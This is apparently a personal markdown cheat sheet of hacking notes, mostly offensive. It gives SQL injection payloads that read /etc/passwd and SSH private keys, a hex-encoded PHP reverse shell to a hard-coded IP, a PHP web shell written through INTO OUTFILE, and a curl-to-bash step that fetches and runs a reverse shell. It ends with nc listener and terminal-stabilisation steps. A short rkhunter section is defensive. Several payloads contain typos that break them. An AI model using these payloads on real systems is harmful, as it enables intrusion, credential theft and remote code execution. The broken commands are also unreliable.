# hacking-notes


## Conversion

In a SQL Injecto to space satinization you can convert PHP code into Hexadecimal

```bash
echo '<?php system("bash -i >& /dev/tcp/10.9.4.202/4443 0>&1") ?>' | xxd -p -u | tr -d '\n'
```

How to convert from hexadecimal to ASCII using xxd command:

echo "your hexadecimal code here" | xxd -ps -r; echo

## Kali Linux

Change Kali Linux keyboard language to Spanish

```bash
setxkbmap es sundeadkeys
```

## Rootkits

How to monitor for linux rootkits

1. Make rkhunter database
```bash
rkhunter --propupd 
``

2. Launch rkhunter
```bash 
rkhunter --enable all
```

## SQL Injection

How to guess number of columns of a table
```sql
whatever' order by <nº> -- -
``` 

If you knwo the number of columns you can make a selection to test your sql injection
```sql
whatever' union select 1,"test" -- -
```

Load a file in a SQLinjection
```sql
whatever ' union select 1,load_file("/etc/password")-- -

whatever ' union select 1,load_file("/home/user/.ssh/id_rsa")-- -

whatever ' union select 1,load_file("/home/user/.ssh/id_rsa.pub")-- -

whatever ' union select 1,load_file("/etc/group")-- -
```

How to know what database exists in a Sql Injection, p.e. with 2 databases
```
whatever ' union select 1,shcema_name from information_scheam.schemadata limit 1,1 -- -

whatever ' union select 1,shcema_name from information_scheam.schemadata limit 2,1 -- -
```

How to list the tables of a database p.g. for the database webapp
```sql
whatever' union select 1,tabla_name from information_sceham.tables where table_schema="webapp" limit 1,1 -- -
```

How to get information of a table from the database name:
```sql
whatever' union select 1, column:name from information_scheam.columns where table_schema="webapp" and table_name="queue" limit 1,1
```

How to get information of columns of a table from the table name:
```sql
whatever' union select 1, group-concat(userID,0x3a,queueNum) from queue -- -
```

How to write into a file with a SQL Injection
```sql
whatever' union select 1,"I was here" INTO OUTFILE "/var/www/html/test.php"-- -
```

How to inject PHP code, in this case remote command execution into an sqlinjection with satinatization:

1. covert a string into hexadecimal and inject the code on the wesite
```bash
echo '<?php echo "<pre> . shell_exec($_REQUEST["cmd"]). "</pre>";?>' | xxd -ps | tr -d "\n"
```
2. Create a reverse shell, reverseh.sh
```bash
#!/bin/bash

bash -i &  /dev/tcp/<ip>/443 0>&1
```

3. Share a server with simpleHttpServer
```bash
python -m SimpleHTTPServer 80
```

4. Curl your reverse.sh into your remote execution injection (point 1) and pipe to bash
```bash 
http://<remote-ip>/remote.php?cmd=curl <your-ip>/reverse.sh | bash 
```


## System Commands

Get users that login into the system

```bash
last
```

Launch a pseudo-control
1. In the remote shell
```bash
script /dev/null -c bash

(and press Control + Z)
```

2. In your shell:
```bash
stty raw -echo

nc -nlvp 443

# <press fg>

reset

# Consolidate your terminal
xterm

export TERM=xterm

export SHELL=bash

# Get correct proporcion
stty rows 52 columsn 197
```
